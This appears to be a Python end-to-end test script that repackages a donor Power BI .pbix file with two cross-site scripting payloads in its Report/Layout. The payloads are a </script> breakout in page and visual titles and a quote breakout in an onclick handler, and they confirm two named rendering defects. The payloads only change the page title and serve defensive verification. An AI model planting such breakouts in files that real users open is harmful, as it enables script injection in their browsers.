"""Build a weaponized `.pbix` from the shipped donor for an end-to-end test.

The payloads go into `Report/Layout` — the exact member the web clone reads — so
they travel the full real pipeline (zip read -> JSON parse -> `inspect_layout` ->
`render_html`) with no test doubles. Two payloads, one per defect, each written by
its own mode so the two effects never mask each other:

* `script`: a page name and a visual title closing `</script>` inside the model
  script (F-1) — fires on load;
* `onclick`: a page name that closes the single-quoted JS literal in `onclick`
  (F-2) — fires when an element is clicked.

Usage:
    python other/e2e-verification/make_evil_pbix.py <mode> <donor.pbix> <out.pbix>
"""

from __future__ import annotations

import json
import sys
import zipfile
from pathlib import Path

SCRIPT_BREAKOUT = "</script><script>document.title='PWNED_SCRIPT'</script>"
JS_BREAKOUT = "P');document.title='PWNED_ONCLICK';//"

_LAYOUT = "Report/Layout"


def _weaponize(layout: dict, mode: str) -> None:
    """Write the payload for `mode` into the decoded layout, in place."""
    sections = layout["sections"]
    if mode == "script":
        sections[1]["displayName"] = SCRIPT_BREAKOUT
        for vc in sections[1]["visualContainers"][:3]:
            cfg = json.loads(vc.get("config") or "{}")
            sv = cfg.setdefault("singleVisual", {})
            sv.setdefault("objects", {})["title"] = [
                {
                    "properties": {
                        "text": {"expr": {"Literal": {"Value": f"'{SCRIPT_BREAKOUT}'"}}}
                    }
                }
            ]
            vc["config"] = json.dumps(cfg)
    elif mode == "onclick":
        sections[0]["displayName"] = JS_BREAKOUT
    else:
        raise SystemExit(f"unknown mode {mode!r}; use 'script' or 'onclick'")


def main(argv: list[str]) -> int:
    mode, donor, out = argv[1], Path(argv[2]), Path(argv[3])

    with zipfile.ZipFile(donor) as src:
        items = {name: src.read(name) for name in src.namelist()}

    layout = json.loads(items[_LAYOUT].decode("utf-16-le"))
    _weaponize(layout, mode)
    items[_LAYOUT] = json.dumps(layout, ensure_ascii=False).encode("utf-16-le")

    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as dst:
        for name, blob in items.items():
            dst.writestr(name, blob)

    print(f"wrote {out} ({out.stat().st_size} B, mode={mode})")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
